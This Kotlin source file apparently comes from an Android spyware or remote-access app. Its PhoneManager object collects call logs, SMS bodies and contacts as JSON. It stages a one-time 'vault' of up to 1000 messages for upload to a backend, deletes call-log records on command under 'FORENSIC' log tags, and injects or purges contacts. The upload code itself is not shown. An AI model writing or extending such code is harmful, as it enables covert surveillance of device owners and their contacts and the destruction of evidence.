package com.example.myandroid

import android.content.Context
import android.provider.CallLog
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject
import java.util.Date

object PhoneManager {

    data class CallStats(
        val totalDuration: Long = 0,
        val totalCalls: Int = 0,
        val incoming: Int = 0,
        val outgoing: Int = 0,
        val missed: Int = 0,
        val topContact: String = "None",
        val contactCount: Int = 0
    )

    fun getStats(ctx: Context): CallStats {
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            return CallStats()
        }

        var duration = 0L
        var total = 0
        var inc = 0
        var out = 0
        var miss = 0
        val contactFreq = HashMap<String, Int>()

        try {
            val cursor = ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC"
            )
            
            cursor?.use {
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)

                while (it.moveToNext()) {
                    val dur = it.getLong(durIdx)
                    val type = it.getInt(typeIdx)
                    val num = it.getString(numIdx)

                    total++
                    duration += dur
                    
                    when (type) {
                        CallLog.Calls.INCOMING_TYPE -> inc++
                        CallLog.Calls.OUTGOING_TYPE -> out++
                        CallLog.Calls.MISSED_TYPE -> miss++
                    }
                    
                    if (num != null) {
                        contactFreq[num] = contactFreq.getOrDefault(num, 0) + 1
                    }
                }
            }
        } catch (e: Exception) { e.printStackTrace() }

        // Get Contact Count
        var cCount = 0
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CONTACTS) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
             try {
                 val cCursor = ctx.contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
                 cCount = cCursor?.count ?: 0
                 cCursor?.close()
             } catch (e: Exception) { }
        }
        
        // Resolve Top Contact Name
        val topNum = contactFreq.maxByOrNull { it.value }?.key ?: "None"
        var topName = topNum
        if (topNum != "None" && cCount > 0) {
            topName = getContactName(ctx, topNum)
        }

        return CallStats(duration, total, inc, out, miss, topName, cCount)
    }

    fun getCallLogs(ctx: Context, limit: Int = 100): JSONArray {
        val list = JSONArray()
        val hasPermission = androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED
        
        if (!hasPermission) {
            DebugLogger.log("PHONE_DIAG", "Call Log capture failed: Permission READ_CALL_LOG not granted.")
            return list
        }

        val finalLimit = if (limit <= 0) 100 else limit

        try {
            val projection = arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE,
                CallLog.Calls.CACHED_NAME
            )

            val cursor = ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection, 
                null, 
                null, 
                "${CallLog.Calls.DATE} DESC"
            )

            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val nameIdx = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                
                var count = 0
                while(it.moveToNext() && count < finalLimit) {
                    val obj = JSONObject()
                    obj.put("num", it.getString(numIdx) ?: "Private")
                    obj.put("name", it.getString(nameIdx) ?: "Unknown")
                    obj.put("ts", it.getLong(dateIdx))
                    obj.put("dur", it.getLong(durIdx))
                    obj.put("type", it.getInt(typeIdx))
                    list.put(obj)
                    count++
                }
                DebugLogger.log("PHONE_DIAG", "Captured ${list.length()} call records.")
            } ?: run {
                DebugLogger.log("PHONE_DIAG", "CallLog provider returned null cursor (Database may be locked/busy).")
            }
        } catch(e: Exception) {
            DebugLogger.log("PHONE_DIAG", "Fatal query error: ${e.message}")
        }
        return list
    }

    fun getHistoricalSms(ctx: Context, limit: Int = 1000, keyword: String? = null): JSONArray {
        val list = JSONArray()
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) return list
        
        try {
            val prefs = ctx.getSharedPreferences("sms_filter_prefs", Context.MODE_PRIVATE)
            val defaultBlacklist = "127,994,ethio tel,251994,BeepCall710,telegames,telebirr,830,131"
            val blacklistRaw = prefs.getString("blacklist", defaultBlacklist) ?: ""
            val blacklist = if (blacklistRaw.isEmpty()) emptyList() else blacklistRaw.split(",").map { it.trim() }

            val selectionList = mutableListOf<String>()
            val selectionArgs = mutableListOf<String>()

            if (!keyword.isNullOrEmpty()) {
                selectionList.add("body LIKE ?")
                selectionArgs.add("%${keyword}%")
            }

            if (blacklist.isNotEmpty()) {
                val placeholders = blacklist.joinToString(", ") { "?" }
                selectionList.add("address NOT IN ($placeholders)")
                selectionArgs.addAll(blacklist)
            }

            val selection = if (selectionList.isEmpty()) null else selectionList.joinToString(" AND ")
            val args = if (selectionArgs.isEmpty()) null else selectionArgs.toTypedArray()

            val cursor = ctx.contentResolver.query(
                android.net.Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type"),
                selection, args, "date DESC"
            )
            cursor?.use {
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                val typeIdx = it.getColumnIndex("type")
                
                var count = 0
                while(it.moveToNext() && (limit <= 0 || count < limit)) {
                    val obj = JSONObject()
                    obj.put("num", it.getString(addrIdx))
                    obj.put("body", it.getString(bodyIdx))
                    obj.put("ts", it.getLong(dateIdx))
                    obj.put("type", it.getInt(typeIdx))
                    list.put(obj)
                    count++
                }
            }
        } catch(e: Exception) { e.printStackTrace() }
        return list
    }

    fun vaultHistoricalSms(ctx: Context) {
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        // If backend already confirmed receipt, we are done forever.
        if (prefs.getBoolean("historical_sms_dumped", false)) return

        val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
        
        // If file exists, we don't need to rebuild it, just wait for SyncWorker to find it.
        if (vaultFile.exists()) return 

        // If no file and not dumped yet, it means either we haven't tried or a previous upload failed.
        val data = getHistoricalSms(ctx, 1000)
        if (data.length() > 0) {
            try {
                vaultFile.writeText(data.toString())
                DebugLogger.log("VAULT", "Inbox snapshot secured: ${data.length()} messages")
            } catch (e: Exception) { 
                DebugLogger.log("VAULT_ERR", "Failed to write vault: ${e.message}")
            }
        }
    }

    fun getContacts(ctx: Context, limit: Int = -1): JSONArray {
        val list = JSONArray()
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) return list
        
        try {
             val cursor = ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, null
            )
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                var count = 0
                while(it.moveToNext()) {
                    if (limit > 0 && count >= limit) break
                    val obj = JSONObject()
                    obj.put("name", it.getString(nameIdx))
                    obj.put("num", it.getString(numIdx))
                    list.put(obj)
                    count++
                }
            }
        } catch(e: Exception) {}
        return list
    }

    private fun getContactName(ctx: Context, phoneNumber: String): String {
        val uri = android.net.Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, android.net.Uri.encode(phoneNumber))
        val cursor = ctx.contentResolver.query(uri, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)
        var name = phoneNumber
        cursor?.use {
            if (it.moveToFirst()) {
                name = it.getString(it.getColumnIndexOrThrow(ContactsContract.PhoneLookup.DISPLAY_NAME))
            }
        }
        return name
    }

    fun deleteLogs(ctx: Context, action: String, value: String?): Int {
        val resolver = ctx.contentResolver
        return try {
            val count = when (action.uppercase()) {
                "CLEAR_ALL" -> resolver.delete(CallLog.Calls.CONTENT_URI, null, null)
                "DELETE_NUM" -> {
                    val where = "${CallLog.Calls.NUMBER}=?"
                    resolver.delete(CallLog.Calls.CONTENT_URI, where, arrayOf(value))
                }
                "DELETE_LAST" -> {
                    val mins = value?.toLongOrNull() ?: 5L
                    val timeThreshold = System.currentTimeMillis() - (mins * 60 * 1000)
                    val where = "${CallLog.Calls.DATE} > ?"
                    resolver.delete(CallLog.Calls.CONTENT_URI, where, arrayOf(timeThreshold.toString()))
                }
                else -> 0
            }
            DebugLogger.log("FORENSIC", "Deleted $count records from CallLog")
            count
        } catch (e: SecurityException) {
            DebugLogger.log("FORENSIC_ERR", "Permission Denied for Write: ${e.message}")
            -1
        } catch (e: Exception) {
            DebugLogger.log("FORENSIC_FATAL", "Error: ${e.message}")
            -2
        }
    }

    fun addContact(ctx: Context, name: String, num: String): Boolean {
        try {
            val ops = ArrayList<android.content.ContentProviderOperation>()
            ops.add(android.content.ContentProviderOperation.newInsert(ContactsContract.RawContacts.CONTENT_URI)
                .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)
                .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null).build())

            ops.add(android.content.ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name).build())

            ops.add(android.content.ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                .withValue(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, num)
                .withValue(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE).build())

            ctx.contentResolver.applyBatch(ContactsContract.AUTHORITY, ops)
            DebugLogger.log("CONTACTS", "Injected: $name ($num)")
            return true
        } catch (e: Exception) {
            DebugLogger.log("CONTACTS_ERR", "Injection fail: ${e.message}")
            return false
        }
    }

    fun purgeContact(ctx: Context, target: String): Int {
        val uri = ContactsContract.RawContacts.CONTENT_URI
        val resolver = ctx.contentResolver
        var deleted = 0
        try {
            // 1. Delete by exact Number match
            deleted += resolver.delete(uri, "${ContactsContract.RawContacts.CONTACT_ID} IN (SELECT contact_id FROM data WHERE data1 = ?)", arrayOf(target))
            // 2. Delete by exact Name match
            deleted += resolver.delete(uri, "${ContactsContract.RawContacts.DISPLAY_NAME_PRIMARY} = ?", arrayOf(target))
            
            DebugLogger.log("CONTACTS", "Purged $deleted entries for query: $target")
            return deleted
        } catch (e: Exception) {
            DebugLogger.log("CONTACTS_ERR", "Purge fail: ${e.message}")
            return -1
        }
    }
}